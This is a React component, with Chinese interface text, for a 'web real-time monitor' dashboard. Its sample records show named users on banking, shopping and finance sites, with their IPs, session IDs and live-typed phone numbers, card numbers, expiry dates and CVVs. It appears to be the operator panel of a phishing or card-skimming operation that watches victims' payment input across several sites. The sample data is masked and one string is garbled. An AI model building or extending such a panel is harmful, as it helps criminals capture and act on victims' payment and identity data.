import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { useState } from "react";

interface UserSubmission {
  id: string;
  status: "submitted" | "processing" | "verified" | "pending_review" | "rejected";
  statusText: string;
  submissionType: "personal_info" | "credit_card" | "identity_verification" | "address_proof";
  websiteName: string;
  currentPage: string;
  userName: string;
  userLocation?: string;
  timestamp: string;
  progress?: number;
  progressText?: string;
  riskLevel: "low" | "medium" | "high";
  dataSize?: string;
  fieldsCount?: number;
  ipAddress?: string;
  sessionId?: string;
  realtimeInput?: {
    phone?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
  };
}

const submissionData: UserSubmission[] = [
  {
    id: "13743",
    status: "processing",
    statusText: "处理中",
    submissionType: "personal_info",
    websiteName: "金融服务平台",
    currentPage: "/profile/personal-info",
    userName: "张小明",
    userLocation: "北京市朝阳区",
    timestamp: "2024-01-20 10:25:16",
    progress: 85,
    progressText: "85%",
    riskLevel: "low",
    dataSize: "402Kb",
    fieldsCount: 12,
    ipAddress: "192.168.1.100",
    sessionId: "sess_abc123",
    realtimeInput: {
      phone: "138****5678",
      cardNumber: "4532 **** **** 1234",
      expiryDate: "12/26",
      cvv: "***"
    }
  },
  {
    id: "13752",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "电商购物网",
    currentPage: "/checkout/payment",
    userName: "李小红",
    userLocation: "上海市浦东区",
    timestamp: "2024-01-20 10:23:45",
    progress: 72,
    progressText: "72%",
    riskLevel: "medium",
    dataSize: "156Kb",
    fieldsCount: 8,
    ipAddress: "192.168.1.105",
    realtimeInput: {
      phone: "189****9876",
      cardNumber: "5555 **** **** 4444",
      expiryDate: "08/25",
      cvv: "***"
    }
  },
  {
    id: "13716",
    status: "pending_review",
    statusText: "待审核",
    submissionType: "identity_verification",
    websiteName: "在线银行系统",
    currentPage: "/kyc/identity-check",
    userName: "王大强",
    userLocation: "广州市天河区",
    timestamp: "2024-01-20 10:20:33",
    riskLevel: "high",
    dataSize: "1.2Mb",
    fieldsCount: 15,
    ipAddress: "192.168.1.88",
    realtimeInput: {
      phone: "159****3210",
      cardNumber: "6226 **** **** 7890",
      expiryDate: "03/27",
      cvv: "***"
    }
  }
];

const getSubmissionTypeIcon = (type: string) => {
  switch (type) {
    case "personal_info": return "👤";
    case "credit_card": return "💳";
    case "identity_verification": return "🆔";
    case "address_proof": return "🏠";
    default: return "📄";
  }
};

const getSubmissionTypeName = (type: string) => {
  switch (type) {
    case "personal_info": return "个人资料";
    case "credit_card": return "信用卡信息";
    case "identity_verification": return "身份验证";
    case "address_proof": return "地址证明";
    default: return "其他���档";
  }
};

export function WebMonitor() {
  const [expandedItems, setExpandedItems] = useState<Set<string>>(new Set());
  const onlineCount = submissionData.filter(s => s.status === "processing").length;
  const todaySubmissions = submissionData.length;

  const toggleExpanded = (id: string) => {
    const newExpanded = new Set(expandedItems);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedItems(newExpanded);
  };

  return (
    <div className="flex-1 bg-background">
      {/* Header */}
      <div className="border-b border-border bg-white px-6 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground">📊 神经网络ML1.15</span>
            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                🔴 LIVE - {onlineCount} 在线处理
              </Badge>
              <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
                今日提交: {todaySubmissions}
              </Badge>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🌐 站点管理
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📊 实时统计
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🔒 安全设定
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              ⚠️ 风险预警
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📝 日志查看
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Table Style List */}
        <div className="bg-white border border-border rounded-lg overflow-hidden">
          {submissionData.map((submission, index) => (
            <div key={submission.id} className="border-b border-border last:border-b-0">
              {/* Main Row */}
              <div className="px-4 py-3 hover:bg-muted/30 transition-colors">
                <div className="flex items-center justify-between">
                  {/* Left side - ID and realtime input */}
                  <div className="flex items-center gap-6">
                    <div className="flex items-center gap-2">
                      <Badge 
                        variant="outline"
                        className={`cursor-pointer text-xs ${
                          submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-200" :
                          submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-200" :
                          submission.status === "verified" ? "bg-green-50 text-green-600 border-green-200" :
                          submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-200" :
                          "bg-red-50 text-red-600 border-red-200"
                        }`}
                        onClick={() => toggleExpanded(submission.id)}
                      >
                        编号: {submission.id}
                      </Badge>
                      <span className="text-sm text-muted-foreground">{submission.statusText}</span>
                    </div>

                    {/* Realtime Input - Horizontal Layout */}
                    {submission.realtimeInput && (
                      <div className="flex items-center gap-3 text-xs bg-red-50 px-3 py-1 rounded border border-red-200">
                        <span className="text-red-600 flex items-center gap-1">
                          🔴 <span className="animate-pulse">●</span>
                        </span>
                        {submission.realtimeInput.phone && (
                          <span className="font-mono">📱 {submission.realtimeInput.phone}</span>
                        )}
                        {submission.realtimeInput.cardNumber && (
                          <span className="font-mono">💳 {submission.realtimeInput.cardNumber}</span>
                        )}
                        {submission.realtimeInput.expiryDate && (
                          <span className="font-mono">📅 {submission.realtimeInput.expiryDate}</span>
                        )}
                        {submission.realtimeInput.cvv && (
                          <span className="font-mono">🔒 {submission.realtimeInput.cvv}</span>
                        )}
                      </div>
                    )}
                  </div>

                  {/* Center - Website, Type, Progress */}
                  <div className="flex items-center gap-8">
                    <div>
                      <div className="text-sm font-medium">{submission.websiteName}</div>
                      <div className="text-xs text-muted-foreground">{submission.currentPage}</div>
                    </div>

                    <div className="flex items-center gap-1">
                      {getSubmissionTypeIcon(submission.submissionType)}
                      <span className="text-sm">{getSubmissionTypeName(submission.submissionType)}</span>
                    </div>

                    {submission.progress && (
                      <div className="min-w-[120px]">
                        <div className="flex justify-between text-xs mb-1">
                          <span>进度</span>
                          <span>{submission.progressText}</span>
                        </div>
                        <Progress value={submission.progress} className="h-2" />
                      </div>
                    )}
                  </div>

                  {/* Right side - Risk and Actions */}
                  <div className="flex items-center gap-4">
                    <Badge 
                      variant="outline"
                      className={`text-xs ${
                        submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
                        submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
                        "bg-green-50 text-green-600 border-green-200"
                      }`}
                    >
                      {submission.riskLevel === "high" ? "🔴 高风险" :
                       submission.riskLevel === "medium" ? "🟡 中风险" :
                       "🟢 低风险"}
                    </Badge>

                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" className="text-xs h-7 px-3">
                        {submission.status === "processing" ? "监控" :
                         submission.status === "pending_review" ? "审核" : "查看"}
                      </Button>
                      <Button variant="outline" size="sm" className="text-xs h-7 px-3">
                        阻止
                      </Button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Expanded Details */}
              {expandedItems.has(submission.id) && (
                <div className="px-4 py-3 bg-muted/20 border-t border-border/50">
                  <div className="grid grid-cols-4 gap-4 text-xs">
                    <div>
                      <span className="text-muted-foreground">提交时间: </span>
                      <span className="font-medium">{submission.timestamp}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">用户: </span>
                      <span className="font-medium">{submission.userName}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">IP地址: </span>
                      <span className="font-medium">{submission.ipAddress}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">数据: </span>
                      <span className="font-medium">{submission.dataSize} • {submission.fieldsCount} 字段</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Bottom Summary */}
        <div className="mt-6 pt-4 border-t border-border">
          <div className="text-xs text-muted-foreground">
            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
          </div>
        </div>
      </div>
    </div>
  );
}
